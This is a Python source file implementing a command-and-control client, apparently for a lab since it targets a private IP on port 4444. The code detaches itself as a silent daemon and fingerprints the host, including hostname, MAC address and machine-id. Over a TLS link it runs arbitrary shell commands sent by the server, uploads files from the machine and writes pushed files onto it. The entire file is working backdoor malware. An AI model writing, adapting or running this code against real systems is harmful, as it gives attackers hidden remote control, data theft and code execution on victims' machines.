# ======================== IMPORTS ========================
import os
import socket
import subprocess
import sys
import time
import ssl 
import platform
import hashlib
import uuid

# ======================== CONSTANTS ========================
CHUNK_SIZE = 262144  # 256 KB
PID_FILE = "/tmp/c2client.pid"
MAX_OUTPUT_SIZE = 500000  # 500KB max output
COMMAND_TIMEOUT = 300  # 5 minutes

# ======================== CLIENT FINGERPRINT ========================
def get_client_fingerprint():
    """Generate unique fingerprint for this client"""
    # Collect identifying information
    fingerprint_data = {
        "hostname": platform.node(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "system": platform.system(),
        "release": platform.release(),
        "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                for elements in range(0,8*6,8)][::-1]),
    }
    
    # Try to get machine-id (Linux/Unix)
    try:
        with open('/etc/machine-id', 'r') as f:
            fingerprint_data["machine_id"] = f.read().strip()
    except:
        try:
            with open('/var/lib/dbus/machine-id', 'r') as f:
                fingerprint_data["machine_id"] = f.read().strip()
        except:
            fingerprint_data["machine_id"] = str(uuid.uuid4())
    
    # Create hash-based fingerprint
    fingerprint_str = str(sorted(fingerprint_data.items()))
    fingerprint_hash = hashlib.sha256(fingerprint_str.encode()).hexdigest()[:16]
    return fingerprint_hash, fingerprint_data

# ======================== NETWORK HELPERS ========================
def client_recv_line(sock: socket.socket) -> str | None:
    # --------- Line Receiver ---------
    data = b""
    while True:
        try:
            chunk = sock.recv(1)
            if not chunk:
                return None if not data else data.decode("utf-8", errors="ignore")
            if chunk == b"\n":
                break
            data += chunk
        except socket.timeout:
            continue
        except (ConnectionError, OSError):
            return None
    return data.decode("utf-8", errors="ignore").strip()

def client_recv_exact(sock: socket.socket, size: int) -> bytes:
    # --------- Exact Byte Receiver ---------
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(min(CHUNK_SIZE, size - len(data)))
        if not chunk:
            raise ConnectionError("Connection closed while receiving file data")
        data += chunk
    return bytes(data)

# ======================== FILE TRANSFER ========================
def client_receive_file(sock: socket.socket, header: str):
    # --------- File Receiver ---------
    if header is None:
        return

    parts = header.split()
    if len(parts) != 3 or parts[0] != "FILE":
        return

    _, filename, size_str = parts
    try:
        size = int(size_str)
    except ValueError:
        return

    with open(filename, "wb") as f:
        received = 0
        while received < size:
            chunk_size = min(CHUNK_SIZE, size - received)
            chunk = sock.recv(chunk_size)
            if not chunk:
                break
            f.write(chunk)
            received += len(chunk)

    sock.sendall(b"RECVOK\n")

def client_send_file(sock: socket.socket, filename: str):
    # --------- File Sender ---------
    if not os.path.isfile(filename):
        sock.sendall(f"[!] File not found: {filename}\n".encode())
        return

    size = os.path.getsize(filename)
    sock.sendall(f"FILE {os.path.basename(filename)} {size}\n".encode())
    with open(filename, "rb") as f:
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
            sock.sendall(chunk)

    sock.sendall(b"RECVOK\n")

    try:
        response = client_recv_line(sock)
        if response == "RECVOK":
            pass
    except:
        pass

# ======================== DAEMON HANDLING ========================
def daemonize():
    # --------- Daemonization ---------
    try:
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)

        sys.stdout.flush()
        sys.stderr.flush()
        with open('/dev/null', 'rb', 0) as dev_null:
            os.dup2(dev_null.fileno(), sys.stdin.fileno())
        with open('/dev/null', 'ab', 0) as dev_null:
            os.dup2(dev_null.fileno(), sys.stdout.fileno())
            os.dup2(dev_null.fileno(), sys.stderr.fileno())

        os.chdir('/')
        os.umask(0)

    except OSError as e:
        print(f"[!] Daemonize failed: {e}")
        sys.exit(1)

def write_pid():
    # --------- PID File Creation ---------
    if os.path.exists(PID_FILE):
        print("[!] Already running?")
        sys.exit(1)
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

# ======================== TLS CONTEXT ========================
def build_tls_context():
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.load_verify_locations("server.crt")
    ctx.check_hostname = False
    return ctx

TLS_CONTEXT = build_tls_context()

# ======================== MAIN CONNECTION LOOP ========================
def connect_to_server():
    # --------- Connection and Command Handling ---------
    # Get client fingerprint once
    fingerprint, fp_data = get_client_fingerprint()
    
    while True:
        client = None
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(10)
            raw.connect(('192.168.56.2', 4444))

            client = TLS_CONTEXT.wrap_socket(raw, server_hostname='C2Server')
            client.settimeout(30)  # 30 second socket timeout
            
            # Send fingerprint on first message
            client.sendall(f"FINGERPRINT {fingerprint}\n".encode())

            try:
                subprocess.Popen(['xterm', '-e', 'echo Hello && bash'])
            except Exception as e:
                print(f"[!] Could not open terminal: {e}")

            while True:
                try:
                    command = client_recv_line(client)
                    if command is None:
                        break

                    # Handle special commands
                    if command.startswith("FILE "):
                        client_receive_file(client, command)
                        continue
                    elif command.startswith("PULL "):
                        filename = command[5:].strip()
                        client_send_file(client, filename)
                        continue
                    elif command == "RECVOK":
                        # Ignore RECVOK from server (acknowledgment)
                        continue
                    elif command.startswith("cd "):
                        path = command[3:].strip()
                        try:
                            os.chdir(path)
                            client.sendall(f"Changed directory to {os.getcwd()}\n".encode())
                        except Exception as e:
                            client.sendall(f"cd error: {e}\n".encode())
                        continue

                    # Regular shell command with timeout
                    try:
                        result = subprocess.run(
                            command, 
                            shell=True, 
                            capture_output=True, 
                            text=True,
                            timeout=COMMAND_TIMEOUT
                        )
                        output = result.stdout + result.stderr
                    except subprocess.TimeoutExpired:
                        output = f"[!] Command timed out after {COMMAND_TIMEOUT} seconds\n"
                    except Exception as e:
                        output = f"[!] Command error: {e}\n"

                    # Limit output size
                    if len(output) > MAX_OUTPUT_SIZE:
                        output = output[:MAX_OUTPUT_SIZE] + f"\n[... Output truncated. Total was {len(output)} bytes ...]\n"

                    if not output.strip():
                        output = "[*] Command executed. No output.\n"

                    # Send output in chunks
                    CHUNK_SIZE_OUTPUT = 65536  # 64KB chunks
                    for i in range(0, len(output), CHUNK_SIZE_OUTPUT):
                        chunk = output[i:i+CHUNK_SIZE_OUTPUT]
                        client.sendall(chunk.encode("utf-8"))
                        time.sleep(0.001)  # Small delay between chunks
                        
                except socket.timeout:
                    # Send keepalive
                    try:
                        client.sendall(b"\n")
                    except:
                        break
                    continue
                except Exception as e:
                    print(f"[!] Command loop error: {e}")
                    break

        except Exception as e:
            print(f"[!] Connection error: {e}")
            time.sleep(5)
        finally:
            if client is not None:
                 try:
                     client.close()
                 except:
                     pass

# ======================== ENTRY POINT ========================
if __name__ == "__main__":
    daemonize()
    write_pid()
    connect_to_server()
    
